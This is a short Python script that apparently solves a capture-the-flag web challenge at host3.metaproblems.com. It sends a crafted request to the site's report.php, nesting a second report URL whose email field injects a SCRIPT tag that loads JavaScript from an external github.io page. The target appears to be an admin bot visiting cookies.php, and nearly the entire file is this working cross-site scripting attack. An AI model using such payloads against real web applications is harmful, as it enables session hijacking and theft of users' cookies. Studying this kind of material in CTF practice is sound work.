import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'DNT': '1',
    'Sec-GPC': '1',
    'Connection': 'keep-alive',
    'Referer': 'http://host3.metaproblems.com:6020/index.php',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=1',
}

params = {
    'report_url': """http://host3.metaproblems.com:6020/report.php?report_url=http%3A%2F%2Fhost3.metaproblems.com%3A6020%2Fcookies.php&report_email="<SCRIPT/SRC='https://amazingrupak.github.io/'></SCRIPT>"@a.com""",
    'report_email': "a@a.com",
}

r = requests.get('http://host3.metaproblems.com:6020/report.php', params=params, headers=headers)

print(r.text)
